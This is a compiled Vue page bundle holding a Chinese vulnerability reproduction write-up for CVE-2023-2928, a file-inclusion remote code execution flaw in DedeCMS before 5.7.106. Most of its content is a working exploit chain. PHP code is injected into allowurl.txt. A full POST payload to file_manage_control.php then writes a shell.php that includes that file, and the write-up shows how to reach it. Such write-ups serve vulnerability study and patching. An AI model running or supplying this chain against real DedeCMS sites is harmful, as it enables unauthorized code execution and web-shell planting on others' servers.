import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as n,e as s}from"./app-58e4a7d6.js";const i={},l=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>版本 5.7.106 之前的 DedeCMS 中存在漏洞，<code>/dede/article_allowurl_edit.php</code> 缺少对该文件中写入内容的过滤，结合 <code>/dede/file_manage_control.php</code> 文件构造文件包含代码，将构成远程代码执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>DedeCMS &lt; 5.7.106
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>文件 <code>/dede/article_allowurl_edit.php</code> 中未对文件内容做任何过滤，会把内容写入到</p><p><code>/data/admin/allowurl.txt</code> 这个文件当中。</p><p>访问文件 <code>/dede/article_allowurl_edit.php</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>www.dedecms.com
www.desdev.cn
bbs.dedecms.com
&lt;?php phpinfo();?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327140733554.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过<code>/dede/file_manage_control.php</code>文件构造文件包含代码：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># Payload</span>
<span class="token assign-left variable">fmdo</span><span class="token operator">=</span>edit<span class="token operator">&amp;</span><span class="token assign-left variable">backurl</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">token</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">activepath</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">filename</span><span class="token operator">=</span>shell.php<span class="token operator">&amp;</span><span class="token assign-left variable">str</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php include_once<span class="token punctuation">(</span><span class="token string">&quot;./data/admin/allowurl.txt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /dede/file_manage_control.php HTTP/1.1
Host: &lt;YOUR_IP&gt;
Content-Length: 135
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://&lt;YOUR_IP&gt;
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://&lt;YOUR_IP&gt;/dede/article_allowurl_edit.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: 
Connection: close

fmdo=edit&amp;backurl=&amp;token=&amp;activepath=&amp;filename=shell.php&amp;str=%3C%3Fphp+include_once%28%22.%2Fdata%2Fadmin%2Fallowurl.txt%22%29%3B%3F%3E
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327141101710.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功写入，访问：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://&lt;YOUR_IP&gt;/shell.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240327141412133.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17),t=[l];function d(p,o){return a(),n("div",null,t)}const m=e(i,[["render",d],["__file","DedeCMS 5.7 file_manage_control.php 文件包含 RCE CVE-2023-2928.html.vue"]]);export{m as default};
